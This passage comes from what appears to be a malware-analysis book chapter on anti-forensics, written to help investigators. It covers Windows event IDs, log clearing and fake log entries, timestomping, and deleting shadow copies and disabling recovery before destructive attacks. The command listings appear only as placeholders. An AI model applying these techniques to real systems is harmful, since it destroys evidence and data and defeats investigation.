    and services), and *security* logs (for events related to security, such as authentication).
    Naturally, there are some event types that security analysts and investigators
    should pay special attention to, as they can offer clues about how a system was
    compromised or what actions malware took on the system. [Table 15-3](chapter15.xhtml#tab15-3)
    lists a small subset of these events.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Heavy_B_11">Table 15-3:</samp> <samp class="SANS_Futura_Std_Book_11">Event
    Types of Interest to Security Analysts and Investigators</samp>
  prefs: []
  type: TYPE_NORMAL
- en: '| <samp class="SANS_Futura_Std_Heavy_B_11">Windows event ID</samp> | <samp
    class="SANS_Futura_Std_Heavy_B_11">Description</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| --- | --- |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4624</samp> | <samp class="SANS_Futura_Std_Book_11">An
    account successfully authenticated (logged in to) Windows. The log records important
    information such as the account’s username and source IP address.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4625</samp> | <samp class="SANS_Futura_Std_Book_11">There
    was a failed login attempt.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4688</samp> | <samp class="SANS_Futura_Std_Book_11">A
    process was started. The log records details such as the process’s name and which
    account initiated the process.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4689</samp> | <samp class="SANS_Futura_Std_Book_11">A
    process was terminated.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4698</samp> | <samp class="SANS_Futura_Std_Book_11">A
    scheduled task was created.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4703</samp> | <samp class="SANS_Futura_Std_Book_11">Token
    privileges were enabled or disabled for an account. Investigators can use this
    to potentially identify privilege elevation and impersonation attempts.</samp>
    |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">4946</samp> | <samp class="SANS_Futura_Std_Book_11">A
    Windows firewall rule was added.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">5140</samp> | <samp class="SANS_Futura_Std_Book_11">A
    network share was accessed. Information such as the user’s account and IP address
    is logged, as well as what type of access permissions the user requested (such
    as Read or Write).</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_Futura_Std_Book_11">7045</samp> | <samp class="SANS_Futura_Std_Book_11">A
    service was installed on the system. The log records information such as the service’s
    name and image path (for example, its executable on disk).</samp> |'
  prefs: []
  type: TYPE_TB
- en: Since logs of these events can be valuable to a forensics investigator, it makes
    sense that clearing or tampering with these event logs can in turn be valuable
    for a malware author.
  prefs: []
  type: TYPE_NORMAL
- en: 'One of the simplest methods of tampering with logs is simply deleting, or clearing,
    them. To clear these event logs, malware can invoke the Windows utility Wevtutil.
    The following commands will wipe the system, application, and security event logs,
    respectively, on the victim system:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE32]'
  prefs: []
  type: TYPE_PRE
- en: 'Or the malware can use a PowerShell command, such as this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE33]'
  prefs: []
  type: TYPE_PRE
- en: This command scrubs all Windows security event logs.
  prefs: []
  type: TYPE_NORMAL
- en: 'Malware can even disable event logging completely during an attack by invoking
    PowerShell to stop the Windows Event Logging service, like so:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE34]'
  prefs: []
  type: TYPE_PRE
- en: 'Keep in mind that deleting logfiles or stopping logging can be quite noisy,
    especially if the victim organization is specifically monitoring for log-tampering
    techniques. Another approach is manually writing new Windows event logs to throw
    off investigators. By creating an event for a fictitious login or for the deletion
    or creation of an imaginary file, for example, the malware author can create a
    “red herring” scenario. They can accomplish this with the PowerShell cmdlet <samp
    class="SANS_TheSansMonoCd_W5Regular_11">Write-EventLog</samp>:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE35]'
  prefs: []
  type: TYPE_PRE
- en: 'Windows events are stored as *.evtx* files inside the *C:\Windows\System32\winevt\Logs*
    directory. You can see an example directory listing in the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE36]'
  prefs: []
  type: TYPE_PRE
- en: 'Each *.evtx* file in this output represents a certain type of logging event,
    such as application events, hardware events, and Internet Explorer events. You
    may spot malware specifically referencing this directory location in its code.
    This can be a telltale sign that the malware is attempting to tamper with these
    files, such as in the following code:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE37]'
  prefs: []
  type: TYPE_PRE
- en: This malware code references the path *C:\Windows\System32\winevt\Logs* ❶ and
    then calls a function that encrypts this data (which I have named <samp class="SANS_TheSansMonoCd_W5Regular_11">encrypt_data</samp>)
    ❷, effectively destroying these files.
  prefs: []
  type: TYPE_NORMAL
- en: 'Furthermore, malware may be able to directly modify *.evtx* files to hide malicious
    activity. This can be a delicate process, and it involves shutting down the event-logging
    services, tampering with the event files, and recalculating a checksum that serves
    as a sort of integrity check. This technique is outside the scope of this book,
    but you can read more about it in the *Medium* blog post “Event Log Tampering
    Part 2: Manipulating Individual Event Logs,” at [*https://<wbr>svch0st<wbr>.medium<wbr>.com<wbr>/event<wbr>-log<wbr>-tampering<wbr>-part<wbr>-2<wbr>-manipulating<wbr>-individual<wbr>-event<wbr>-logs<wbr>-3de37f7e3a85*](https://svch0st.medium.com/event-log-tampering-part-2-manipulating-individual-event-logs-3de37f7e3a85).'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp>
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '*While I was writing this book, Kaspersky reported on a malware variant that
    writes malicious code into Windows event logs and executes the code in memory
    directly from the logs themselves. This technique combines event log tampering
    techniques with memory-resident techniques. You can read more about this in Denis
    Legezo’s post “A New Secret Stash for ‘Fileless’ Malware” on the Kaspersky blog
    at* [https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/](https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/).'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Timestomping</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*Timestomping* is a technique used to mislead forensics investigators by modifying
    file timestamps. In the NTFS (the default filesystem in modern versions of Windows),
    a timestamp is represented as a 64-bit integer (more formally called a *filetime
    structure*) that equates to the number of 100-nanosecond intervals, or ticks,
    since January 1, 1601, UTC time. This sounds quite complicated, but the important
    thing to know is that, when converted to a human-readable format, this integer
    represents a specific date and time. For example, the timestamp integer <samp
    class="SANS_TheSansMonoCd_W5Regular_11">133346988430000000</samp> can be converted
    to the human-readable string of <samp class="SANS_TheSansMonoCd_W5Regular_11">Monday,
    July 24, 2023 7:00:43 PM</samp>. Internally, Windows uses the function <samp class="SANS_TheSansMonoCd_W5Regular_11">FileTimeToSystemTime</samp>
    to make this conversion. The NTFS format keeps track of file and directory timestamps
    for when a file or directory is written to or otherwise modified, accessed (opened
    and read), or created (or copied, moved, and so on), as well as when a file or
    directory’s metadata has changed. Metadata can include the file or directory’s
    name, attributes, permissions, and other data. You can read more about the filetime
    structure format here: [*https://<wbr>www<wbr>.ntfs<wbr>.com<wbr>/exfat<wbr>-time<wbr>-stamp<wbr>.htm*](https://www.ntfs.com/exfat-time-stamp.htm).'
  prefs: []
  type: TYPE_NORMAL
- en: 'To modify these filetime timestamps in an effort to mislead investigators,
    malware can use a WinAPI function designed specifically for this use case: <samp
    class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp>. The <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp>
    function accepts three parameters: the file creation time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpCreationTime</samp>),
    the last access time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastAccessTime</samp>),
    and the last modified time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastWriteTime</samp>).
    Malware can use the functions <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileInformationByHandle</samp>
    and <samp class="SANS_TheSansMonoCd_W5Regular_11">NtSetInformationFile</samp>
    similarly to tamper with either its own timestamps or those of other files and
    directories.'
  prefs: []
  type: TYPE_NORMAL
- en: During the forensics investigation process, it is very common for investigators
    to create a timeline of all filesystem events. File timestamp metadata and logs
    are often part of these timelines. If malware employs timestomping and log tampering
    techniques, this investigation timeline will be inaccurate, causing a delay in
    the investigation process at best and an unresolved case at worst. For forensics
    investigations that must be defended in court, the consequences can be especially
    severe.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Destroying the System</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Perhaps the most permanent and destructive technique for hiding evidence is
    total system destruction. You might be wondering why an attacker would wish to
    destroy a system to cover up evidence, as this would surely alert the victim user
    or organization to the attack. While this is true, it’s still the most permanent
    and absolute method of covering up evidence of an attack. If the system is destroyed,
    there’s a good chance it will put a halt to the investigation. This is also a
    way to avoid attribution of the attack.
  prefs: []
  type: TYPE_NORMAL
- en: To destroy evidence of the attack, the malware could encrypt the entire disk
    and the master boot record (MBR), rendering the system unbootable, similar to
    how some ransomware operates. The primary difference here is that the attacker
    would destroy the encryption and decryption keys, as they’re not required anymore.
    Or the malware could overwrite sections of the disk with random data to achieve
    a similar effect.
  prefs: []
  type: TYPE_NORMAL
- en: 'The malware could also disable utilities that would otherwise allow investigators
    to recover the system, such as Windows Startup Repair, or delete all backups.
    These are some of the commands it might run as a precursor to a destructive attack:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE38]'
  prefs: []
  type: TYPE_PRE
- en: The first command deletes all volume shadow copies, a backup feature in Windows
    that allows copies of files to be restored. Deleting these backups prevents investigators
    from retrieving evidence stored as shadow copies. The second and third commands
    prevent Windows from booting into recovery mode, which is an approach sometimes
    used by investigators or system administrators to recover the system.
  prefs: []
  type: TYPE_NORMAL
- en: Complete system destruction for the sole purpose of anti-forensics is rare.
    It’s much more common for malware to have a primary goal of destroying systems
    and data for the purpose of service disruption, with anti-forensics only as a
    secondary goal. For example, the malware family Shamoon destroyed data on the
    target systems, which, as a by-product, may have hindered investigation efforts.
    HermeticWiper (briefly covered in [Chapter 14](chapter14.xhtml)) is another example.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_B_11">Summary</samp>
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: In this chapter, you saw how fileless attacks work and how malware authors leverage
    memory- and registry-resident malware to achieve their goal without leaving obvious
    evidence behind. You also learned how threat actors can abuse native and signed
    Windows binaries (LOLBins) to covertly execute malicious code in order to bypass
    security controls such as AppLocker or support fileless attacks. We then delved
    deeper into the topic of hiding evidence by exploring some anti-forensics techniques
    that malware employs to cover its tracks and further impede investigation efforts.
    In the next chapter, we’ll dive into how malware evades detection using encoding
    and encryption.
  prefs: []
  type: TYPE_NORMAL
